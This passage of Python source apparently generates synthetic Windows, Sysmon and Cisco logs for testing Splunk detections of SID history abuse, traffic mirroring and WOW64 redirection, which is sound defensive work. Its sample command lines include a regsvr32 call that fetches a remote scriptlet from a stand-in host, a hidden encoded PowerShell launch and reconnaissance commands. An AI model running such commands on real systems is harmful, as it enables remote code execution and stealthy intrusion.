        return self._classic(event) if self.render_format == 'classic' else self._xml(event)

    def _standalone(self):
        """An event rendered outside a plan — a preview, or a test of the format."""
        return {'host': 'DC01', 'dest': 'DC01', 'src_user': random.choice(AD_ADMIN_USERS),
                'user': random.choice(AD_TARGET_USERS), 'event_code': 4738,
                'sid_history': random_privileged_sid()}

    def _fields(self, e):
        """The values both renderings share, resolved once."""
        code = int(e['event_code'])
        titles = {**AD_EVENT_TITLES, **{c: (t, k) for c, t, k in AD_OTHER_EVENT_CODES}}
        title, task = titles[code]
        computer = e['dest']
        return {
            'code': code,
            'title': title,
            'task': task,
            'computer': computer if '.' in computer else f'{computer}.{self._domain.lower()}.local',
            'target_user': e['user'],
            'target_sid': f'{self._domain_sid}-{random.randint(1103, 9999)}',
            'subject_user': e['src_user'],
            'subject_sid': f'{self._domain_sid}-{random.randint(500, 1102)}',
            'logon_id': f'0x{random.randint(0x30000, 0xFFFFFF):X}',
            'record_id': random.randint(100000, 999999),
            'sid_history': e.get('sid_history'),
            'primary_group': '515' if str(e['user']).endswith('$') else '513',
        }

    def _xml(self, f):
        f = self._fields(f)
        # A computer account change carries two attributes a user account has not.
        computer_only = ''
        if f['code'] == 4742:
            computer_only = ("\n    <Data Name=\"DnsHostName\">-</Data>"
                             "\n    <Data Name=\"ServicePrincipalNames\">-</Data>")
        changed = '' if f['sid_history'] is None else f'''
    <Data Name="SamAccountName">{f['target_user']}</Data>
    <Data Name="DisplayName">-</Data>
    <Data Name="UserPrincipalName">-</Data>
    <Data Name="HomeDirectory">-</Data>
    <Data Name="HomePath">-</Data>
    <Data Name="ScriptPath">-</Data>
    <Data Name="ProfilePath">-</Data>
    <Data Name="UserWorkstations">-</Data>
    <Data Name="PasswordLastSet">-</Data>
    <Data Name="AccountExpires">%%1794</Data>
    <Data Name="PrimaryGroupId">{f['primary_group']}</Data>
    <Data Name="AllowedToDelegateTo">-</Data>
    <Data Name="OldUacValue">0x210</Data>
    <Data Name="NewUacValue">0x210</Data>
    <Data Name="UserAccountControl">-</Data>
    <Data Name="UserParameters">-</Data>
    <Data Name="SidHistory">{escape(str(f['sid_history']))}</Data>
    <Data Name="LogonHours">%%1797</Data>{computer_only}'''

        event_xml = f'''<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{{54849625-5478-4994-A5BA-3E3B0328C30D}}" />
    <EventID>{f['code']}</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>13824</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="{datetime.now().isoformat()}" />
    <EventRecordID>{f['record_id']}</EventRecordID>
    <Correlation />
    <Execution ProcessID="756" ThreadID="{random.randint(1000, 9000)}" />
    <Channel>Security</Channel>
    <Computer>{f['computer']}</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="Dummy">-</Data>
    <Data Name="TargetUserName">{f['target_user']}</Data>
    <Data Name="TargetDomainName">{self._domain}</Data>
    <Data Name="TargetSid">{f['target_sid']}</Data>
    <Data Name="SubjectUserSid">{f['subject_sid']}</Data>
    <Data Name="SubjectUserName">{f['subject_user']}</Data>
    <Data Name="SubjectDomainName">{self._domain}</Data>
    <Data Name="SubjectLogonId">{f['logon_id']}</Data>
    <Data Name="PrivilegeList">-</Data>{changed}
  </EventData>
</Event>'''
        return render_windows_xml(event_xml)

    def _classic(self, f):
        f = self._fields(f)
        timestamp = datetime.now().strftime('%m/%d/%Y %I:%M:%S %p')
        changed = '' if f['sid_history'] is None else (
            "\n"
            "Changed Attributes:\n"
            f"\tSAM Account Name:\t{f['target_user']}\n"
            "\tDisplay Name:\t\t-\n"
            "\tUser Principal Name:\t-\n"
            "\tHome Directory:\t\t-\n"
            "\tHome Drive:\t\t-\n"
            "\tScript Path:\t\t-\n"
            "\tProfile Path:\t\t-\n"
            "\tUser Workstations:\t-\n"
            "\tPassword Last Set:\t-\n"
            "\tAccount Expires:\t\t%%1794\n"
            f"\tPrimary Group ID:\t{f['primary_group']}\n"
            "\tAllowedToDelegateTo:\t-\n"
            "\tOld UAC Value:\t\t0x210\n"
            "\tNew UAC Value:\t\t0x210\n"
            "\tUser Account Control:\t-\n"
            "\tUser Parameters:\t-\n"
            # Splunk's wel-col-kv reads this label as SID_History, not SidHistory.
            f"\tSID History:\t\t{f['sid_history']}\n"
            "\tLogon Hours:\t\t%%1797\n")
        return (
            f"{timestamp}\n"
            "LogName=Security\n"
            f"EventCode={f['code']}\n"
            "EventType=0\n"
            f"ComputerName={f['computer']}\n"
            "SourceName=Microsoft Windows security auditing.\n"
            "Type=Information\n"
            f"RecordNumber={f['record_id']}\n"
            "Keywords=Audit Success\n"
            f"TaskCategory={f['task']}\n"
            "OpCode=Info\n"
            f"Message={f['title']}.\n"
            "\n"
            "Subject:\n"
            f"\tSecurity ID:\t\t{self._domain}\\{f['subject_user']}\n"
            f"\tAccount Name:\t\t{f['subject_user']}\n"
            f"\tAccount Domain:\t\t{self._domain}\n"
            f"\tLogon ID:\t\t{f['logon_id']}\n"
            "\n"
            "Target Account:\n"
            f"\tSecurity ID:\t\t{self._domain}\\{f['target_user']}\n"
            f"\tAccount Name:\t\t{f['target_user']}\n"
            f"\tAccount Domain:\t\t{self._domain}\n"
            f"{changed}"
            "\n"
            "Additional Information:\n"
            "\tPrivileges:\t\t-"
        )


WINDOWS_AD_ATTACK_TYPES = {
    'windows_ad_sid_history_addition': {
        'name': 'Windows AD Privileged Account SID History Addition',
        'description': "A privileged account's SID added to another account's sidHistory (T1134.005)",
        'log_type': 'windows',
        'category': 'Active Directory',
        # Not a datamodel search: the detection reads the Security log directly
        # through the `wineventlog_security` macro.
        'datamodel': None,
        'splunk_research_url': 'https://research.splunk.com/endpoint/6b521149-b91c-43aa-ba97-c2cac59ec830/',
        'data_sources': [
            {'log_type': 'windows', 'sourcetype': 'WinEventLog:Security',
             'label': 'Windows Security · account changed (4738, 4742)',
             'formats': ['xml', 'classic']},
        ],
        # splunk/security_content detections/endpoint/
        # windows_ad_privileged_account_sid_history_addition.yml
        'detection': {
            'name': 'Windows AD Privileged Account SID History Addition',
            'id': '6b521149-b91c-43aa-ba97-c2cac59ec830',
            'macro': 'wineventlog_security',
            'where': 'EventCode IN (4742, 4738) AND NOT SidHistory IN ("%%1793", "-")',
            # After the where: the SID is unwrapped and looked up as an identity.
            'rex': r'(^%\{|^)(?P<SidHistory>.*?)(\}$|$)',
            'lookup': 'identity_lookup_expanded — category "privileged", identity as SidHistory',
            'fields': ['_time', 'action', 'status', 'host', 'user', 'userSid',
                       'SidHistory', 'Logon_ID', 'src_user', 'dest'],
            'entities': ['host', 'src_user', 'dest'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each event triggers the detection on its own — no threshold to reach.',
        'identity_fields': [
            {'field': 'host', 'mode': 'asset', 'label': 'Host',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine Splunk stamps the event with. Left on Random it '
                     'follows the Destination below — a domain controller logs its own '
                     'changes. Only HEC can set it; in a file the reader decides.'},
            {'field': 'src_user', 'mode': 'asset', 'label': 'Source User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account making the change (SubjectUserName).'},
            {'field': 'dest', 'mode': 'asset', 'label': 'Destination',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The domain controller the change is logged on (Computer).'},
            {'field': 'sid_history', 'mode': 'text', 'label': 'Privileged SID planted',
             'default': PRIVILEGED_SID_DEFAULT, 'kind': 'sid',
             'hint': 'Already have your Assets & Identities in Enterprise Security? '
                     'Use one of your own privileged SIDs instead.'},
        ],
        # The detection ends in a lookup this application cannot write. Rather
        # than leave that implicit, the warning hands over the exact SID the
        # attack will plant, so one row in an identities lookup makes it fire.
        'warning': {
            'text': 'the detection ends in a lookup against your Enterprise Security '
                    'identities, and fires for none of them unless one carries a SID in '
                    '`identity` and `privileged` in `category`. Add that row to an active '
                    'identities lookup, copying the SID below:',
            'code': PRIVILEGED_SID_DEFAULT,
        },
        'ai_fields': {
            'host': {'type': 'either', 'options': [
                        {'type': 'entity', 'entity_type': 'domain_controller', 'entity_field': 'nt_host'},
                        {'type': 'entity', 'entity_type': 'server', 'entity_field': 'nt_host'},
                     ],
                     'description': 'The domain controller the event is stamped with'},
            'src_user': {'type': 'either', 'options': [
                            {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                            {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                         ],
                         'description': 'Account that changed the target account'},
            'dest': {'type': 'either', 'options': [
                        {'type': 'entity', 'entity_type': 'domain_controller', 'entity_field': 'nt_host'},
                        {'type': 'entity', 'entity_type': 'server', 'entity_field': 'nt_host'},
                     ],
                     'description': 'Domain controller the change is logged on'},
        },
        'field_behaviors': {},
        'sample_logs': [
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4738</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-02-18T10:30:01.0000000Z'/><EventRecordID>456789</EventRecordID><Channel>Security</Channel><Computer>DC01.contoso.local</Computer></System><EventData><Data Name='TargetUserName'>jsmith</Data><Data Name='TargetSid'>S-1-5-21-1004336348-1177238915-682003330-1105</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SidHistory'>S-1-5-21-1004336348-1177238915-682003330-512</Data></EventData></Event>",
        ],
    },
}


# ============================================================================
# Cisco network attack generators
# ============================================================================

#: Accounts that hold enough privilege to start a monitor session.
IOS_ADMIN_USERS = ['netadmin', 'noc_ops', 'admin', 'svc_netbackup', 'j.reseau']

#: What an operator types to build a SPAN session. The detection matches
#: `command="monitor session*"`, so the wildcard is on the tail, not the head.
MONITOR_SESSION_COMMANDS = [
    'monitor session {session} source interface {interface}',
    'monitor session {session} source interface {interface} both',
    'monitor session {session} destination interface {interface}',
    'monitor session {session} source vlan {vlan}',
    'monitor session {session} destination remote vlan {vlan}',
    'monitor session {session} filter vlan {vlan}',
]

#: Configuration an operator types all day, which the same mnemonic logs and
#: the detection's fourth clause leaves alone.
BENIGN_LOGGED_COMMANDS = [
    'interface {interface}',
    'no shutdown',
    'ip route 0.0.0.0 0.0.0.0 10.0.0.1',
    'router ospf 1',
    'logging buffered 16384',
    'ntp server 10.10.10.1',
    'spanning-tree portfast',
    'show monitor session all',        # reads a session, never starts one
]

#: The three events a device logs when mirroring starts. Facility and mnemonic
#: are what the detection reads and what the add-on extracts from
#: `%FACILITY-SEVERITY-MNEMONIC:`; the text after the colon is free-form on the
#: device and illustrative here.
TRAFFIC_MIRRORING_VARIANTS = [
    ('MIRROR', 6, 'ETH_SPAN_SESSION_UP', 'Session {session} state is up'),
    ('SPAN', 6, 'SESSION_UP', 'Session {session} is up'),
    ('SPAN', 6, 'PKTCAP_START', 'Packet capture session {session} started on {interface}'),
]

#: Near misses that share the shape without meeting a clause: a session ending,
#: and the facility whose name merely starts the same way — the detection reads
#: facility="SPAN", and SPANTREE is a different facility, not a prefix match.
TRAFFIC_MIRRORING_NEAR_MISSES = [
    ('SPAN', 6, 'SESSION_DOWN', 'Session {session} is down'),
    ('MIRROR', 6, 'ETH_SPAN_SESSION_DOWN', 'Session {session} state is down'),
    ('SPANTREE', 5, 'TOPOTRAP', 'Topology Change Trap for vlan {vlan}'),
    ('SPANTREE', 5, 'EXTENDED_SYSID', 'Extended SysId enabled for type vlan'),
]


class CiscoTrafficMirroringGenerator(BaseAttackGenerator):
    """A SPAN / monitor session started on a Cisco device (T1020.001).

    Not a datamodel search either: the detection reads cisco:ios through the
    `cisco_networks` macro and keys on `facility`, `mnemonic` and, for the
    fourth clause, `command`.

    The first three come out of `%FACILITY-SEVERITY-MNEMONIC:`, which
    `[extract_cisco_ios-general]` reads from any line the source already emits.
    `command` does not: the add-on extracts it with

        EXTRACT-cisco_ios-cfglog_loggedcmd =
            CFGLOG_LOGGEDCMD(\\s)?:\\sUser:(?<user>\\S+)\\s\\s(?<vendor_action>logged
            command):(?<command>.+)

    — two spaces after the user name, and nothing between the colon and the
    command. A single space leaves `command` unextracted, and a space after the
    colon makes the value ` monitor session …`, which `command="monitor
    session*"` does not match. Both shapes parse as an event and neither
    reaches the detection, so the tests pin the exact one.
    """

    FIELD_DEFAULTS = {}

    def __init__(self, field_behaviors, options=None):
        super().__init__(field_behaviors, options)
        # The source's own formatter and pools: one place decides what an IOS
        # line looks like, and the benign events are the ones it already emits.
        self._ios = CiscoIOSLogGenerator()

    @property
    def syslog_host(self):
        """The device the event came from, for the `logging origin-id` header.

        A collector has nothing else to attribute an IOS line to, and the
        detection groups by host, so the name chosen in the form has to be the
        one in front of the message.
        """
        return self._identity.get('host')

    # ── planning ────────────────────────────────────────────────────────────

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        One device for the run — Random, from Assets & Identities, or typed —
        and per event one of the four ways mirroring announces itself. The noise
        is the same device's ordinary chatter plus the near misses: a session
        going down, the SPANTREE facility, and the same logged-command mnemonic
        carrying something other than a monitor session.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}
        host_choice = identity.get('host') if isinstance(identity.get('host'), dict) else {}
        host = _single_value(host_choice, 'host', values,
                             lambda r: r.choice(IOS_HOSTNAMES), rng)

        def event(**extra):
            return {'host': host, **extra}

        def session(): return rng.randint(1, 4)
        def vlan(): return rng.choice([10, 20, 30, 100, 200])
        def interface(): return rng.choice(IOS_SPAN_INTERFACES)

        attack_identities = []
        for _ in range(attacks):
            # Three quarters of the sessions announce themselves, the rest are
            # caught by the command that starts them.
            if rng.random() < 0.75:
                facility, severity, mnemonic, body = rng.choice(TRAFFIC_MIRRORING_VARIANTS)
                attack_identities.append(event(
                    facility=facility, severity=severity, mnemonic=mnemonic,
                    message=body.format(session=session(), interface=interface())))
            else:
                attack_identities.append(event(
                    facility='PARSER', severity=5, mnemonic='CFGLOG_LOGGEDCMD',
                    user=rng.choice(IOS_ADMIN_USERS),
                    command=rng.choice(MONITOR_SESSION_COMMANDS).format(
                        session=session(), interface=interface(), vlan=vlan())))

        noise_identities = []
        for _ in range(noise):
            draw = rng.random()
            if draw < 0.35:
                facility, severity, mnemonic, body = rng.choice(TRAFFIC_MIRRORING_NEAR_MISSES)
                noise_identities.append(event(
                    facility=facility, severity=severity, mnemonic=mnemonic,
                    message=body.format(session=session(), vlan=vlan())))
            elif draw < 0.6:
                noise_identities.append(event(
                    facility='PARSER', severity=5, mnemonic='CFGLOG_LOGGEDCMD',
                    user=rng.choice(IOS_ADMIN_USERS),
                    command=rng.choice(BENIGN_LOGGED_COMMANDS).format(interface=interface())))
            else:
                # Whatever the device would be saying anyway.
                noise_identities.append(event(ordinary=True))
        return attack_identities, noise_identities

    # ── rendering ───────────────────────────────────────────────────────────

    def generate(self) -> str:
        self.event_count += 1
        return self._render(self._identity)

    def generate_noise(self) -> str:
        return self._render(self._identity)

    def _render(self, event):
        event = event or self._standalone()
        if event.get('ordinary'):
            return self._ios.generate()
        if event.get('mnemonic') == 'CFGLOG_LOGGEDCMD':
            # Two spaces, and no space after the colon: the add-on's extraction
            # is exact and the detection compares the value it produces.
            message = f"User:{event['user']}  logged command:{event['command']}"
        else:
            message = event['message']
        return self._ios._format_log(event['facility'], event['severity'],
                                     event['mnemonic'], message)

    def _standalone(self):
        """An event rendered outside a plan — a preview, or a format test."""
        facility, severity, mnemonic, body = random.choice(TRAFFIC_MIRRORING_VARIANTS)
        return {'host': random.choice(IOS_HOSTNAMES), 'facility': facility,
                'severity': severity, 'mnemonic': mnemonic,
                'message': body.format(session=random.randint(1, 4),
                                       interface=random.choice(IOS_SPAN_INTERFACES))}


CISCO_ATTACK_TYPES = {
    'cisco_traffic_mirroring': {
        'name': 'Cisco Traffic Mirroring (SPAN)',
        'description': 'A SPAN or packet-capture session started on a Cisco device '
                       '(T1020.001 Traffic Duplication)',
        'log_type': 'cisco_ios',
        'category': 'Network',
        # Not a datamodel search: the detection reads the device's syslog
        # through the `cisco_networks` macro.
        'datamodel': None,
        'splunk_research_url': 'https://research.splunk.com/network/42b3b753-5925-49c5-9742-36fa40a73990/',
        'data_sources': [
            {'log_type': 'cisco_ios', 'sourcetype': 'cisco:ios',
             'label': 'Cisco IOS · SPAN, packet capture and logged commands',
             'formats': ['default']},
        ],
        # splunk/security_content detections/network/detect_traffic_mirroring.yml
        'detection': {
            'name': 'Detect Traffic Mirroring',
            'id': '42b3b753-5925-49c5-9742-36fa40a73990',
            'macro': 'cisco_networks',
            'where': '(facility="MIRROR" mnemonic="ETH_SPAN_SESSION_UP") '
                     'OR (facility="SPAN" mnemonic="SESSION_UP") '
                     'OR (facility="SPAN" mnemonic="PKTCAP_START") '
                     'OR (mnemonic="CFGLOG_LOGGEDCMD" command="monitor session*")',
            'by': ['host', 'facility', 'mnemonic'],
            'fields': ['host', 'facility', 'mnemonic', 'firstTime', 'lastTime', 'count'],
            'entities': ['host'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each event triggers the detection on its own — no threshold to reach.',
        'identity_fields': [
            {'field': 'host', 'mode': 'asset', 'label': 'Device',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The switch or router the session was started on. It is the name '
                     'the detection groups by: over HEC the event is stamped with it, '
                     'and on a syslog destination it is what the device calls itself in '
                     'front of the message.'},
        ],
        'ai_fields': {
            'host': {'type': 'either', 'options': [
                        {'type': 'entity', 'entity_type': 'router', 'entity_field': 'nt_host'},
                        {'type': 'entity', 'entity_type': 'firewall', 'entity_field': 'nt_host'},
                     ],
                     'description': 'Cisco device the mirroring session was started on'},
        },
        'field_behaviors': {},
        'sample_logs': [
            '009830: Sep 15 22:53:41.625: %SPAN-6-SESSION_UP: Session 1 is up',
            '009831: Sep 15 22:53:42.104: %MIRROR-6-ETH_SPAN_SESSION_UP: Session 1 state is up',
            '009832: Sep 15 22:53:42.887: %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin  logged command:monitor session 1 source interface GigabitEthernet1/0/12',
        ],
    },
}


#: Executables that ship in both System32 and SysWOW64, so a 32-bit caller
#: asking for the 64-bit path is silently given the 32-bit image.
WOW64_REDIRECTED = [
    ('cmd.exe', '/c whoami /all'),
    ('cmd.exe', '/c net localgroup administrators'),
    ('rundll32.exe', 'shell32.dll,Control_RunDLL'),
    ('regsvr32.exe', '/s /u /i:http://updates.example/p.sct scrobj.dll'),
    ('wscript.exe', 'C:\\Users\\Public\\update.vbs'),
    ('cscript.exe', '//nologo C:\\Users\\Public\\collect.vbs'),
    ('mshta.exe', 'C:\\Users\\Public\\report.hta'),
    ('net.exe', 'user administrator'),
]

#: The same binaries under WindowsPowerShell, whose path carries the folder too.
WOW64_POWERSHELL = (
    'WindowsPowerShell\\v1.0\\powershell.exe',
    '-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
)

#: What launches one: a 32-bit parent, which is how the redirection happens.
WOW64_PARENTS = [
    'C:\\Windows\\SysWOW64\\cmd.exe',
    'C:\\Windows\\SysWOW64\\wscript.exe',
    'C:\\Program Files (x86)\\LegacyApp\\agent.exe',
    'C:\\Program Files (x86)\\Updater\\updater32.exe',
]

#: Ordinary process creations, for the noise: neither path is SysWOW64.
BENIGN_PROCESSES = [
    ('C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
     '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer'),
    ('C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE',
     '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /dde'),
    ('C:\\Windows\\System32\\taskhostw.exe', 'C:\\Windows\\System32\\taskhostw.exe KEYROAMING'),
    ('C:\\Windows\\System32\\SearchIndexer.exe', 'C:\\Windows\\System32\\SearchIndexer.exe /Embedding'),
]


class WindowsSysWow64Generator(Windows4688Generator):
    """A 32-bit image in SysWOW64 whose command line names System32 (T1036.009).

    What the detection reads, and why the two disagree: a 32-bit process that
    launches `C:\\Windows\\System32\\cmd.exe` is redirected by WOW64 to the
    32-bit image, so the 4688 records `NewProcessName` in SysWOW64 while
    `CommandLine` still carries the System32 path it asked for. The search wants
    exactly that pair:

        Processes.process_path = "*\\Windows\\SysWOW64\\*"
        Processes.process      = "*windows\\system32\\*"

    Splunk_TA_windows builds both from one 4688, in either rendering:

        XML      <Data Name='NewProcessName'> -> new_process       -> process_path
                 <Data Name='CommandLine'>    -> Process_Command_Line -> process
        classic  New Process Name:            -> New_Process_Name  -> process_path
                 Process Command Line:        -> Process_Command_Line -> process

    with one condition on the second: `EVAL-process` only takes the command line
    when its first token holds a backslash, falling back to the image path
    otherwise. A command line that starts with a bare `cmd.exe` would therefore
    land in `process` without the System32 path, and the detection would not
    see it — so every command line here starts with the full path, which is what
    Windows writes anyway.
    """

    FIELD_DEFAULTS = {}

    def __init__(self, field_behaviors, options=None):
        super().__init__(field_behaviors, options)
        # Which of the two declared sources this instance renders. The detection
        # reads process_path and process, and both add-ons build that pair: the
        # Windows one from NewProcessName and CommandLine on a 4688, the Sysmon
        # one from Image and CommandLine on an EventID 1. Same two values, two
        # envelopes.
        self.source_log_type = (options or {}).get('source_log_type') or 'windows'
        self._sysmon = SysmonLogGenerator() if self.source_log_type == 'sysmon' else None

    # ── planning ────────────────────────────────────────────────────────────

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        One machine and one account for the run — Random, from Assets &
        Identities, or typed — then per event the executable that was asked for
        in System32 and served from SysWOW64.

        The noise is the two near misses, one per clause: the same redirection
        the other way round (a System32 image, so `process_path` fails) and a
        SysWOW64 image whose command line names no System32 path (so `process`
        fails), plus ordinary process creations that match neither.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(WINDOWS_WORKSTATIONS), rng)
        user = _single_value(choice('user'), 'user', values,
                             lambda r: r.choice(WINDOWS_ATTACK_USERS), rng)

        def event(**extra):
            return {'dest': dest, 'user': user,
                    'parent_process_path': rng.choice(WOW64_PARENTS), **extra}

        def redirected():
            """The pair a 32-bit caller gets: asked for System32, ran SysWOW64."""
            if rng.random() < 0.15:
                relative, arguments = WOW64_POWERSHELL
            else:
                name, arguments = rng.choice(WOW64_REDIRECTED)
                relative = name
            return relative, arguments

        attack_identities = []
        for _ in range(attacks):
            relative, arguments = redirected()
            attack_identities.append(event(
                process_path=f'C:\\Windows\\SysWOW64\\{relative}',
                command_line=f'C:\\Windows\\System32\\{relative} {arguments}'.strip()))

        noise_identities = []
        for _ in range(noise):
            draw = rng.random()
            relative, arguments = redirected()
            if draw < 0.35:
                # A 64-bit process doing the same work: the command line names
                # System32, but so does the image, so process_path misses.
                noise_identities.append(event(
                    process_path=f'C:\\Windows\\System32\\{relative}',
                    command_line=f'C:\\Windows\\System32\\{relative} {arguments}'.strip()))
            elif draw < 0.7:
                # A 32-bit process minding its own business: the image is in
                # SysWOW64, but nothing in the command line names System32.
                noise_identities.append(event(
                    process_path=f'C:\\Windows\\SysWOW64\\{relative}',
                    command_line=f'C:\\Windows\\SysWOW64\\{relative} {arguments}'.strip()))
            else:
                path, command = rng.choice(BENIGN_PROCESSES)
                noise_identities.append(event(process_path=path, command_line=command))
        return attack_identities, noise_identities

    # ── rendering ───────────────────────────────────────────────────────────

    def generate(self) -> str:
        self.event_count += 1
        return self._from_identity(self._identity)

    def generate_noise(self) -> str:
        return self._from_identity(self._identity)

    def _from_identity(self, identity):
        e = {**self._standalone(), **(identity or {})}
        if self._sysmon is not None:
            # Sysmon reports the same two values under Image and CommandLine,
            # so the redirection reads identically once the add-on has mapped
            # them to process_path and process.
            return self._sysmon.render(self._sysmon.process_event(
                image=e['process_path'], command_line=e['command_line'],
                parent_image=e['parent_process_path'],
                original_file_name=e['process_path'].rsplit('\\', 1)[-1],
                dest=e['dest'], user=e['user']))
        return self._render(self._event(
            user=e['user'], dest=e['dest'], process_path=e['process_path'],
            command_line=e['command_line'], parent_process_path=e['parent_process_path']))

    def _standalone(self):
        """An event rendered outside a plan — a preview, or a format test."""
        name, arguments = random.choice(WOW64_REDIRECTED)
        return {'dest': random.choice(WINDOWS_WORKSTATIONS),
                'user': random.choice(WINDOWS_ATTACK_USERS),
                'parent_process_path': random.choice(WOW64_PARENTS),
                'process_path': f'C:\\Windows\\SysWOW64\\{name}',
                'command_line': f'C:\\Windows\\System32\\{name} {arguments}'}


WINDOWS_SYSWOW64_ATTACK_TYPES = {
    'windows_syswow64_runs_system32': {
        'name': 'Windows Unusual SysWOW64 Process Run System32 Executable',
        'description': 'A 32-bit image in SysWOW64 whose command line names a System32 '
                       'executable — WOW64 redirection used to break the process tree '
                       '(T1036.009)',
        'log_type': 'windows',
        'category': 'Endpoint',
        'datamodel': 'Endpoint',
        'splunk_research_url': 'https://research.splunk.com/endpoint/e4602172-db86-4315-86df-da66fb40bcde/',
        # Both sources the detection lists. Sysmon reports the redirection the
        # same way — Image against CommandLine — and the add-on maps them to the
        # same process_path and process the Windows one does. user_id, which the
        # search groups by, comes from Splunk_TA_windows' generic
        # [XmlWinEventLog] stanza, which Sysmon events reach through
        # `rename = XmlWinEventLog`; the Sysmon add-on produces none itself.
        'data_sources': [
            {'log_type': 'windows', 'sourcetype': 'WinEventLog:Security',
             'label': 'Windows Security · process creation (4688)',
             'formats': ['xml', 'classic']},
            {'log_type': 'sysmon',
             'sourcetype': 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
             'label': 'Sysmon · process creation (EventID 1)',
             'formats': ['xml']},
        ],
        # splunk/security_content detections/endpoint/
        # windows_unusual_syswow64_process_run_system32_executable.yml
        'detection': {
            'name': 'Windows Unusual SysWOW64 Process Run System32 Executable',
            'id': 'e4602172-db86-4315-86df-da66fb40bcde',
            'datamodel': 'Endpoint.Processes',
            'where': 'Processes.process_path = "*\\\\Windows\\\\SysWOW64\\\\*" '
                     'AND Processes.process = "*windows\\\\system32\\\\*"',
            'by': ['action', 'dest', 'original_file_name', 'parent_process',
                   'parent_process_exec', 'parent_process_guid', 'parent_process_id',
                   'parent_process_name', 'parent_process_path', 'process', 'process_exec',
                   'process_guid', 'process_hash', 'process_id', 'process_integrity_level',
                   'process_name', 'process_path', 'user', 'user_id', 'vendor_product'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each event triggers the detection on its own — no threshold to reach.',
        'identity_fields': [
            {'field': 'dest', 'mode': 'asset', 'label': 'Endpoint',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine the process was created on (Computer).'},
            {'field': 'user', 'mode': 'asset', 'label': 'User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account the process ran as (SubjectUserName).'},
        ],
        'ai_fields': {
            'dest': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'nt_host',
                     'description': 'Workstation the redirected process ran on'},
            'user': {'type': 'either', 'options': [
                        {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                        {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                     ],
                     'description': 'Account the process ran as'},
        },
        'field_behaviors': {},
        'sample_logs': [
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2026-02-18T10:30:01.0000000Z'/><EventRecordID>456789</EventRecordID><Channel>Security</Channel><Computer>WKS-FIN01</Computer></System><EventData><Data Name='SubjectUserName'>jsmith</Data><Data Name='NewProcessName'>C:\\Windows\\SysWOW64\\cmd.exe</Data><Data Name='ParentProcessName'>C:\\Program Files (x86)\\LegacyApp\\agent.exe</Data><Data Name='CommandLine'>C:\\Windows\\System32\\cmd.exe /c whoami /all</Data></EventData></Event>",
        ],
    },
}

# ============================================================================
# Registry and factory
# ============================================================================

# Internal registry: attack_type -> {**metadata, 'generator_class': cls}
ATTACK_REGISTRY: dict = {}


#: Where Windows keeps each firewall rule: one REG_SZ value per rule, named by
#: the rule's GUID. Splunk's own test data for this detection writes exactly
#: here (attack_data T1112/firewall_modify_delete).
FIREWALL_RULES_KEY = ('HKLM\\System\\CurrentControlSet\\Services\\SharedAccess'
                      '\\Parameters\\FirewallPolicy\\FirewallRules')

#: A rule's value, in the pipe-delimited form netsh writes. `v2.26` is the
#: schema version the tested build emits.
FIREWALL_RULE_SHAPES = [
    'v2.26|Action=Allow|Active=TRUE|Dir=In|App={app}|Name={name}|',
    'v2.30|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort={port}|Name={name}|',
    'v2.30|Action=Allow|Active=TRUE|Dir=Out|Protocol=6|RPort={port}|App={app}|Name={name}|',
